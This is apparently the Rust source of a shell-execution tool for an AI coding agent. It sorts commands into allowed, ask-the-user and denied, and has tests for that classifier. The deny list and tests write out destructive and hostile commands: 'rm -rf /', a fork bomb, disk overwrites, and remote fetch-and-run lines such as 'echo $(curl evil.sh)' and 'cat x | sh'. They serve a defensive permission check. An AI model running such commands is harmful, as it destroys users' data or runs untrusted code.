//! Command execution.
//!
//! This is the most powerful and the most dangerous tool of the registry. The approach is to
//! classify each command **from its actual text**, into three categories:
//!
//! - allowed without asking, for a closed set of read-only commands;
//! - denied outright, for a handful of patterns that no legitimate development session needs
//!   and whose effect is irreversible;
//! - subject to user approval for everything else — the default case, by design.
//!
//! This allowlist is not a sandbox: a shell remains a shell, and the only real guarantee comes
//! from the user's explicit approval. It exists to avoid interrupting them for a `git status`,
//! not to pretend to confine the agent.

use std::time::Duration;

use async_trait::async_trait;
use po_core::tool::Permission;
use po_core::{ToolOutcome, ToolSpec};
use serde_json::{Value, json};

use crate::{Tool, ToolContext, required_str};

const DEFAULT_TIMEOUT: Duration = Duration::from_secs(120);
const MAX_TIMEOUT: Duration = Duration::from_secs(600);

/// Read-only commands, run without interrupting the user.
/// Compared on the first word, and on the first two for subcommands.
const READ_ONLY: &[&str] = &[
    "ls", "pwd", "cat", "head", "tail", "wc", "file", "stat", "which", "echo", "date",
    "find", "grep", "rg", "fd", "tree", "du", "df", "env", "uname", "whoami", "sort", "uniq",
];

const READ_ONLY_SUBCOMMANDS: &[(&str, &str)] = &[
    ("git", "status"), ("git", "log"), ("git", "diff"), ("git", "show"),
    ("git", "branch"), ("git", "remote"), ("git", "blame"),
    ("cargo", "check"), ("cargo", "tree"), ("cargo", "metadata"),
    ("npm", "list"), ("npm", "ls"), ("pip", "list"), ("go", "list"),
];

/// Patterns denied without asking. Each one is an irreversible operation that reaches far
/// beyond the workspace — denying costs a round trip, accepting by mistake costs the machine.
const FORBIDDEN: &[(&str, &str)] = &[
    ("rm -rf /", "recursive deletion of the system root"),
    ("rm -rf /*", "recursive deletion of the system root"),
    ("mkfs", "filesystem formatting"),
    ("dd if=", "low-level disk write"),
    (":(){", "fork bomb"),
    ("chmod -R 777 /", "opening permissions on the whole system"),
    ("> /dev/sda", "direct write to a block device"),
];

/// Programs denied when they are the command run, not when they are merely named:
/// `grep -rn shutdown src` looks for a function, it stops nothing.
const FORBIDDEN_PROGRAMS: &[(&str, &str)] = &[
    ("shutdown", "machine shutdown"),
    ("reboot", "machine reboot"),
    ("poweroff", "machine shutdown"),
    ("halt", "machine shutdown"),
    ("stop-computer", "machine shutdown"),
    ("restart-computer", "machine reboot"),
];

pub struct BashTool;

#[async_trait]
impl Tool for BashTool {
    fn name(&self) -> &str {
        "bash"
    }

    fn spec(&self) -> ToolSpec {
        ToolSpec::new(
            "bash",
            // The real shell is announced: a model told "bash" writes bash, and on Windows
            // `cmd.exe` rejected each of its commands (measured: three to four failures per
            // task before this change).
            format!(
                "Runs a command from the workspace root, with {}. Standard output and standard \
                 error are returned together.",
                detected_shell().description
            ),
            json!({
                "type": "object",
                "properties": {
                    "command": {"type": "string"},
                    "timeout_seconds": {"type": "integer", "description": "120 by default, 600 at most"}
                },
                "required": ["command"]
            }),
        )
    }

    fn permission(&self, input: &Value) -> Permission {
        match input.get("command").and_then(Value::as_str) {
            Some(command) => classify(command),
            // A missing command will be rejected at execution anyway; we do not bother the
            // user over a malformed call.
            None => Permission::Deny,
        }
    }

    async fn run(&self, id: &str, input: Value, ctx: &ToolContext) -> ToolOutcome {
        let command = match required_str(&input, "command") {
            Ok(value) => value,
            Err(err) => return ToolOutcome::error(id, err),
        };
        if let Some(reason) = forbidden_reason(command) {
            return ToolOutcome::error(id, format!("command refused — {reason}"));
        }

        let timeout = input
            .get("timeout_seconds")
            .and_then(Value::as_u64)
            .map(Duration::from_secs)
            .unwrap_or(DEFAULT_TIMEOUT)
            .min(MAX_TIMEOUT);

        let mut process = shell_command(command);
        process
            .current_dir(ctx.workspace.root())
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .kill_on_drop(true);
        #[cfg(unix)]
        process.process_group(0);

        let started = std::time::Instant::now();
        let mut child = match process.spawn() {
            Ok(child) => child,
            Err(err) => return ToolOutcome::error(id, format!("cannot execute: {err}")),
        };
        // Declared after the child, so dropped before it: on a timeout or an interrupted turn,
        // what the shell started goes too, not just the shell.
        let mut tree = TreeGuard::new(&child);
        let (stdout_pipe, stderr_pipe) = (child.stdout.take(), child.stderr.take());
        let run = async {
            use tokio::io::AsyncReadExt;
            let (mut stdout, mut stderr) = (Vec::new(), Vec::new());
            let read_out = async {
                if let Some(mut pipe) = stdout_pipe {
                    let _ = pipe.read_to_end(&mut stdout).await;
                }
            };
            let read_err = async {
                if let Some(mut pipe) = stderr_pipe {
                    let _ = pipe.read_to_end(&mut stderr).await;
                }
            };
            let (status, (), ()) = tokio::join!(child.wait(), read_out, read_err);
            status.map(|status| std::process::Output { status, stdout, stderr })
        };
        let output = match tokio::time::timeout(timeout, run).await {
            Ok(Ok(output)) => {
                tree.disarm();
                output
            }
            Ok(Err(err)) => return ToolOutcome::error(id, format!("cannot execute: {err}")),
            Err(_) => {
                return ToolOutcome::error(
                    id,
                    format!(
                        "command interrupted after {} s — rerun it with a longer timeout or in the \
                         background",
                        timeout.as_secs()
                    ),
                );
            }
        };

        let elapsed = started.elapsed();
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        let code = output.status.code().unwrap_or(-1);

        // Both streams are returned together: many tools write their diagnostics to stderr
        // while succeeding, and separating them would deprive the model of context.
        let mut body = String::new();
        if !stdout.trim().is_empty() {
            body.push_str(&stdout);
        }
        if !stderr.trim().is_empty() {
            if !body.is_empty() {
                body.push('\n');
            }
            body.push_str(&stderr);
        }
        if body.trim().is_empty() {
            body = "(no output)".into();
        }

        let display = po_i18n::t!(
            "tools.bash.display",
            command = first_line(command),
            code = code,
            secs = format!("{:.1}", elapsed.as_secs_f32())
        );
        if output.status.success() {
            ToolOutcome::ok(id, ctx.clamp(&body)).with_display(display)
        } else {
            // A non-zero exit code is information, not a harness failure: the model must read
            // it to fix its command.
            ToolOutcome::error(id, ctx.clamp(&format!("exit code {code}\n\n{body}")))
                .with_display(display)
        }
    }
}

/// Stops a command's whole process tree when dropped before it ended. Killing the shell alone
/// left what it had started running (measured with Git Bash: `sleep` survived its `bash`), a
/// `cargo test` then kept its lock on `target`.
///
/// On Windows, the tree is a job object: every process the shell starts enters it, even through
/// Git Bash's emulated `fork`, which breaks the parent links `taskkill /T` follows (measured:
/// `sleep` survived it). On Unix, the command has its own process group.
struct TreeGuard {
    armed: bool,
    #[cfg(windows)]
    job: Option<job::Job>,
    #[cfg(unix)]
    pid: Option<u32>,
}

impl TreeGuard {
    fn new(child: &tokio::process::Child) -> Self {
        #[cfg(windows)]
        {
            let job = job::Job::new().filter(|job| child.raw_handle().is_some_and(|handle| job.assign(handle)));
            Self { armed: true, job }
        }
        #[cfg(unix)]
        {
            Self { armed: true, pid: child.id() }
        }
    }

    /// The command ended on its own: what it left running in the background stays.
    fn disarm(&mut self) {
        self.armed = false;
        #[cfg(windows)]
        if let Some(job) = &self.job {
            job.release();
        }
    }
}

impl Drop for TreeGuard {
    fn drop(&mut self) {
        if !self.armed {
            return;
        }
        #[cfg(windows)]
        if let Some(job) = &self.job {
            job.kill();
        }
        #[cfg(unix)]
        if let Some(pid) = self.pid {
            // The minus sign reaches the whole process group.
            let _ = std::process::Command::new("kill")
                .args(["-KILL", &format!("-{pid}")])
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .status();
        }
    }
}

#[cfg(windows)]
mod job {
    use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
    use windows_sys::Win32::System::JobObjects::{
        AssignProcessToJobObject, CreateJobObjectW, JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE, JOBOBJECT_EXTENDED_LIMIT_INFORMATION,
        JobObjectExtendedLimitInformation, SetInformationJobObject, TerminateJobObject,
    };

    pub struct Job(HANDLE);

    // SAFETY: a job handle can be used and closed from any thread.
    unsafe impl Send for Job {}
    unsafe impl Sync for Job {}

    impl Job {
        pub fn new() -> Option<Self> {
            // SAFETY: an anonymous job with default security; the handle is checked.
            let handle = unsafe { CreateJobObjectW(std::ptr::null(), std::ptr::null()) };
            if handle.is_null() {
                return None;
            }
            let job = Job(handle);
            job.limit(JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE);
            Some(job)
        }

        fn limit(&self, flags: u32) {
            // SAFETY: a zeroed structure is a valid "no limit", only the flags are set.
            unsafe {
                let mut info: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = std::mem::zeroed();
                info.BasicLimitInformation.LimitFlags = flags;
                SetInformationJobObject(
                    self.0,
                    JobObjectExtendedLimitInformation,
                    (&raw const info).cast(),
                    std::mem::size_of::<JOBOBJECT_EXTENDED_LIMIT_INFORMATION>() as u32,
                );
            }
        }

        pub fn assign(&self, process: std::os::windows::io::RawHandle) -> bool {
            // SAFETY: both handles are alive: the job here, the process held by its `Child`.
            unsafe { AssignProcessToJobObject(self.0, process as HANDLE) != 0 }
        }

        /// Closing the job will no longer stop its processes.
        pub fn release(&self) {
            self.limit(0);
        }

        pub fn kill(&self) {
            // SAFETY: the handle is alive until drop.
            unsafe { TerminateJobObject(self.0, 1) };
        }
    }

    impl Drop for Job {
        fn drop(&mut self) {
            // SAFETY: the handle was created by `new` and is closed once.
            unsafe { CloseHandle(self.0) };
        }
    }
}

fn first_line(command: &str) -> &str {
    command.lines().next().unwrap_or(command)
}

/// Shell that runs the tool's commands, chosen once for the whole session: the tool description
/// depends on it, and it must stay stable so that the server can reuse the cached prompt.
#[derive(Debug, Clone)]
pub struct Shell {
    pub program: std::path::PathBuf,
    pub args: &'static [&'static str],
    /// What the model reads in the tool description.
    pub description: &'static str,
}

pub fn detected_shell() -> &'static Shell {
    static SHELL: std::sync::OnceLock<Shell> = std::sync::OnceLock::new();
    SHELL.get_or_init(detect_shell)
}

fn detect_shell() -> Shell {
    // An explicit choice wins: `PO_SHELL=path/to/bash`.
    if let Some(path) = std::env::var_os("PO_SHELL").filter(|p| !p.is_empty()) {
        let path = std::path::PathBuf::from(path);
        let name = path.file_stem().and_then(|s| s.to_str()).unwrap_or("").to_ascii_lowercase();
        return match name.as_str() {
            "pwsh" | "powershell" => powershell(path),
            "cmd" => cmd(),
            _ => posix(path, "bash"),
        };
    }
    platform_shell()
}

fn posix(program: std::path::PathBuf, _name: &str) -> Shell {
    Shell { program, args: &["-c"], description: "bash (POSIX syntax)" }
}

#[cfg(windows)]
fn powershell(program: std::path::PathBuf) -> Shell {
    Shell {
        program,
        args: &["-NoProfile", "-NonInteractive", "-Command"],
        description: "PowerShell on Windows (PowerShell syntax, not bash)",
    }
}

#[cfg(windows)]
fn cmd() -> Shell {
    Shell {
        program: "cmd".into(),
        args: &["/C"],
        description: "cmd.exe on Windows (cmd syntax: double quotes only, `&&` to chain)",
    }
}

#[cfg(not(windows))]
fn powershell(program: std::path::PathBuf) -> Shell {
    Shell { program, args: &["-NoProfile", "-NonInteractive", "-Command"], description: "PowerShell" }
}

#[cfg(not(windows))]
fn cmd() -> Shell {
    posix("sh".into(), "sh")
}

#[cfg(not(windows))]
fn platform_shell() -> Shell {
    Shell { program: "sh".into(), args: &["-c"], description: "sh (POSIX syntax)" }
}

/// On Windows, the order of preference follows what models know how to write: bash above all.
/// Git Bash is present on most development machines; PowerShell next; `cmd.exe` as a last
/// resort, because it is always there.
#[cfg(windows)]
fn platform_shell() -> Shell {
    if let Some(bash) = find_git_bash() {
        return Shell {
            program: bash,
            args: &["-c"],
            description: "bash (Git Bash on Windows: POSIX syntax, paths /c/… or C:/…)",
        };
    }
    for name in ["pwsh", "powershell"] {
        if let Some(path) = find_on_path(&format!("{name}.exe")) {
            return powershell(path);
        }
    }
    cmd()
}

#[cfg(windows)]
fn find_on_path(file: &str) -> Option<std::path::PathBuf> {
    let path = std::env::var_os("PATH")?;
    std::env::split_paths(&path).map(|dir| dir.join(file)).find(|candidate| candidate.is_file())
}

/// Looks for the `bash.exe` of Git for Windows. The one in `System32` is excluded: it is the WSL
/// launcher, which would run the command in another machine, with other paths.
#[cfg(windows)]
fn find_git_bash() -> Option<std::path::PathBuf> {
    let mut candidates = Vec::new();
    if let Some(git) = find_on_path("git.exe") {
        // `...\Git\cmd\git.exe`, `...\Git\bin\git.exe` or `...\Git\mingw64\bin\git.exe`.
        for ancestor in git.ancestors().skip(1).take(3) {
            candidates.push(ancestor.join("bin").join("bash.exe"));
        }
    }
    for var in ["ProgramFiles", "ProgramW6432", "LOCALAPPDATA"] {
        if let Some(base) = std::env::var_os(var) {
            let base = std::path::PathBuf::from(base);
            candidates.push(base.join("Git").join("bin").join("bash.exe"));
            candidates.push(base.join("Programs").join("Git").join("bin").join("bash.exe"));
        }
    }
    candidates.into_iter().find(|candidate| {
        let text = candidate.to_string_lossy().to_ascii_lowercase();
        candidate.is_file() && !text.contains("system32") && !text.contains("windowsapps")
    })
}

fn shell_command(command: &str) -> tokio::process::Command {
    let shell = detected_shell();
    let mut process = tokio::process::Command::new(&shell.program);
    process.args(shell.args).arg(command);
    process
}

/// Classifies a command. A pure function, exhaustively tested: it decides when the user is
/// interrupted and when they are not.
pub fn classify(command: &str) -> Permission {
    let normalized = command.trim();
    if normalized.is_empty() {
        return Permission::Deny;
    }
    if forbidden_reason(normalized).is_some() {
        return Permission::Deny;
    }

    // A chain or a redirection can hide anything behind a harmless command
    // (`ls && rm -rf ~`, `ls & rm -rf ~`, a second line). We do not try to parse a shell: we ask.
    if normalized.contains(['&', '|', ';', '>', '<', '`', '\n', '\r']) || normalized.contains("$(") {
        return Permission::Ask;
    }

    let words: Vec<&str> = normalized.split_whitespace().collect();
    let Some((program, args)) = words.split_first() else {
        return Permission::Deny;
    };
    let program = program.rsplit(['/', '\\']).next().unwrap_or(program);

    if READ_ONLY.contains(&program) && !writes_or_runs(program, args) {
        return Permission::Allow;
    }
    if let Some((subcommand, rest)) = args.split_first()
        && READ_ONLY_SUBCOMMANDS.contains(&(program, *subcommand))
        && !git_writes(subcommand, rest)
    {
        return Permission::Allow;
    }
    Permission::Ask
}

/// The options that turn a reading command into one that writes, deletes or runs another
/// (`find -delete`, `fd -x`, `rg --pre`, `sort -o`): the user is asked then. `env` followed by
/// anything runs it.
fn writes_or_runs(program: &str, args: &[&str]) -> bool {
    let has = |options: &[&str]| args.iter().any(|a| options.iter().any(|o| a == o || a.starts_with(&format!("{o}="))));
    match program {
        "env" => !args.is_empty(),
        "find" => has(&["-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprint0", "-fprintf", "-fls"]),
        "fd" => has(&["-x", "--exec", "-X", "--exec-batch"]),
        "rg" => has(&["--pre"]),
        "sort" => has(&["-o", "--output"]) || args.iter().any(|a| a.starts_with("-o") && !a.starts_with("--")),
        "tree" => has(&["-o"]),
        "date" => has(&["-s", "--set"]),
        _ => false,
    }
}

/// `git branch` and `git remote` also create, rename and delete; `--output` writes a file.
fn git_writes(subcommand: &str, args: &[&str]) -> bool {
    if args.iter().any(|a| a.starts_with("--output")) {
        return true;
    }
    match subcommand {
        // Listing only: options, none of those that change something.
        "branch" => args.iter().any(|a| {
            !a.starts_with('-')
                || matches!(
                    *a,
                    "-d" | "-D" | "-m" | "-M" | "-c" | "-C" | "-f" | "-u" | "--delete" | "--move" | "--copy" | "--force"
                        | "--unset-upstream" | "--edit-description"
                )
                || a.starts_with("--set-upstream")
        }),
        "remote" => !matches!(args.first(), None | Some(&"-v" | &"--verbose" | &"show" | &"get-url")),
        _ => false,
    }
}

fn forbidden_reason(command: &str) -> Option<&'static str> {
    let normalized = command.to_ascii_lowercase();
    // We compare on a form without superfluous spaces so as not to be bypassed by
    // `rm  -rf  /`, while keeping the comparison simple and predictable.
    let squeezed: String = normalized.split_whitespace().collect::<Vec<_>>().join(" ");
    if let Some((_, reason)) = FORBIDDEN.iter().find(|(pattern, _)| squeezed.contains(pattern) || normalized.contains(pattern)) {
        return Some(reason);
    }
    // The first word of each command of the line, past `sudo`: that is what runs.
    const SEPARATORS: [char; 6] = [';', '&', '|', '\n', '\r', '('];
    let mut at_start = true;
    for token in normalized.split_inclusive(|c: char| c.is_whitespace() || SEPARATORS.contains(&c)) {
        let word = token.trim_end_matches(|c: char| c.is_whitespace() || SEPARATORS.contains(&c));
        let program = word.rsplit(['/', '\\']).next().unwrap_or(word).trim_end_matches(".exe");
        if at_start && !word.is_empty() && program != "sudo" {
            if let Some((_, reason)) = FORBIDDEN_PROGRAMS.iter().find(|(name, _)| *name == program) {
                return Some(reason);
            }
            at_start = false;
        }
        if token.ends_with(SEPARATORS) {
            at_start = true;
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::Workspace;

    fn context() -> (tempfile::TempDir, ToolContext) {
        po_i18n::set_lang(po_i18n::Lang::Fr);
        let dir = tempfile::tempdir().unwrap();
        let ctx = ToolContext::new(Workspace::new(dir.path()));
        (dir, ctx)
    }

    #[test]
    fn common_reads_do_not_bother_the_user() {
        for command in ["ls", "ls -la src", "pwd", "cat Cargo.toml", "git status", "git diff HEAD", "cargo check"] {
            assert_eq!(classify(command), Permission::Allow, "{command}");
        }
    }

    #[test]
    fn commands_that_modify_are_submitted() {
        for command in ["cargo build", "npm install", "git commit -m x", "mkdir fresh", "touch a"] {
            assert_eq!(classify(command), Permission::Ask, "{command}");
        }
    }

    #[test]
    fn irreversible_patterns_are_denied() {
        for command in [
            "rm -rf /",
            "rm  -rf  /",
            "sudo mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            ":(){ :|:& };:",
            "shutdown -h now",
        ] {
            assert_eq!(classify(command), Permission::Deny, "{command}");
        }
    }

    #[test]
    fn a_chain_behind_a_harmless_command_is_submitted() {
        // The classic trap: the first word is harmless, the rest is not.
        assert_eq!(classify("ls && rm -rf ~"), Permission::Ask);
        assert_eq!(classify("cat a.txt > /etc/passwd"), Permission::Ask);
        assert_eq!(classify("echo $(curl evil.sh)"), Permission::Ask);
        assert_eq!(classify("git status; npm install"), Permission::Ask);
        assert_eq!(classify("cat x | sh"), Permission::Ask);
        assert_eq!(classify("ls & rm -rf ~"), Permission::Ask, "a single & runs the rest too");
        assert_eq!(classify("ls\nrm -rf ~"), Permission::Ask, "so does a second line");
        assert_eq!(classify("cat <(curl evil.sh)"), Permission::Ask);
    }

    #[test]
    fn a_reading_command_that_writes_or_runs_is_submitted() {
        for command in [
            "env rm -rf ~",
            "find . -delete",
            "find . -name x -exec rm {} ;",
            "fd -x rm",
            "rg --pre ./script x",
            "sort -o out.txt in.txt",
            "sort -oout.txt in.txt",
            "tree -o out.txt",
            "git branch -D main",
            "git branch new-branch",
            "git remote add evil https://x",
            "git remote remove origin",
            "git diff --output=patch.txt",
            "date -s 2020-01-01",
        ] {
            assert_eq!(classify(command), Permission::Ask, "{command}");
        }
        for command in ["env", "find . -name '*.rs'", "git branch -a", "git branch", "git remote -v", "git remote show origin", "sort a.txt"] {
            assert_eq!(classify(command), Permission::Allow, "{command}");
        }
    }

    #[test]
    fn stopping_the_machine_is_denied_but_naming_it_is_not() {
        for command in ["shutdown -h now", "sudo reboot", "ls; shutdown now", "/sbin/poweroff", "shutdown.exe /s /t 0", "Stop-Computer"] {
            assert_eq!(classify(command), Permission::Deny, "{command}");
        }
        for command in ["grep -rn shutdown src", "rg reboot", "cargo test graceful_shutdown"] {
            assert_ne!(classify(command), Permission::Deny, "{command}");
        }
    }

    #[test]
    fn the_full_path_does_not_bypass_the_classification() {
        assert_eq!(classify("/bin/ls -la"), Permission::Allow);
        assert_eq!(classify("/usr/bin/rm -rf /"), Permission::Deny);
    }

    #[test]
    fn an_empty_command_is_denied() {
        assert_eq!(classify(""), Permission::Deny);
        assert_eq!(classify("   "), Permission::Deny);
    }

    #[test]
    fn a_writing_git_subcommand_stays_submitted() {
        assert_eq!(classify("git push"), Permission::Ask);
        assert_eq!(classify("git reset --hard"), Permission::Ask);
        assert_eq!(classify("git log --oneline"), Permission::Allow);
    }

    #[tokio::test]
    async fn a_successful_command_returns_its_output() {
        let (_dir, ctx) = context();
        let outcome = BashTool.run("b", json!({"command": "echo hello"}), &ctx).await;
        assert!(!outcome.is_error, "{}", outcome.content);
        assert!(outcome.content.contains("hello"));
        assert!(outcome.display.unwrap().contains("code 0"));
    }

    #[tokio::test]
    async fn a_failure_is_returned_to_the_model_with_its_code() {
        let (_dir, ctx) = context();
        // `exit 3` is written the same way in cmd.exe and in sh.
        let outcome = BashTool.run("b", json!({"command": "exit 3"}), &ctx).await;
        assert!(outcome.is_error);
        assert!(outcome.content.contains("exit code 3"));
    }

    #[tokio::test]
    async fn the_command_runs_in_the_workspace() {
        let (_dir, ctx) = context();
        std::fs::write(ctx.workspace.root().join("witness.txt"), "x").unwrap();
        let shell = detected_shell().description;
        let command = if shell.starts_with("cmd") {
            "dir /b"
        } else if shell.starts_with("PowerShell") {
            "Get-ChildItem -Name"
        } else {
            "ls"
        };
        let outcome = BashTool.run("b", json!({"command": command}), &ctx).await;
        assert!(outcome.content.contains("witness.txt"));
    }

    #[tokio::test]
    async fn a_forbidden_command_is_blocked_at_execution() {
        let (_dir, ctx) = context();
        let outcome = BashTool.run("b", json!({"command": "rm -rf /"}), &ctx).await;
        assert!(outcome.is_error);
        assert!(outcome.content.contains("refused"));
    }

    #[tokio::test]
    async fn a_timeout_is_announced_clearly() {
        let (_dir, ctx) = context();
        let command = if cfg!(windows) {
            "ping -n 10 127.0.0.1"
        } else {
            "sleep 10"
        };
        let outcome = BashTool
            .run("b", json!({"command": command, "timeout_seconds": 1}), &ctx)
            .await;
        assert!(outcome.is_error);
        assert!(outcome.content.contains("interrupted"));
    }

    #[tokio::test]
    async fn a_timeout_stops_what_the_shell_started_too() {
        let (_dir, ctx) = context();
        let shell = detected_shell().description;
        if !(shell.starts_with("bash") || shell.starts_with("sh")) {
            return;
        }
        // A grandchild: a shell inside the shell, which writes once the tool has given up.
        let command = "sh -c 'sleep 3; echo late > late.txt'; true";
        let outcome = BashTool.run("b", json!({"command": command, "timeout_seconds": 1}), &ctx).await;
        assert!(outcome.content.contains("interrupted"));
        tokio::time::sleep(Duration::from_secs(4)).await;
        assert!(!ctx.workspace.root().join("late.txt").exists(), "the grandchild survived the timeout");
    }

    #[tokio::test]
    async fn an_empty_output_is_reported() {
        let (_dir, ctx) = context();
        let command = if cfg!(windows) { "cd ." } else { "true" };
        let outcome = BashTool.run("b", json!({"command": command}), &ctx).await;
        assert!(outcome.content.contains("no output"));
    }

    #[test]
    fn the_announced_shell_matches_the_launched_program() {
        let shell = detected_shell();
        assert!(!shell.description.is_empty());
        assert!(!shell.args.is_empty());
        let name = shell.program.to_string_lossy().to_ascii_lowercase();
        assert!(
            !(name.contains("system32") && name.contains("bash")),
            "the WSL launcher must never be selected"
        );
    }
}
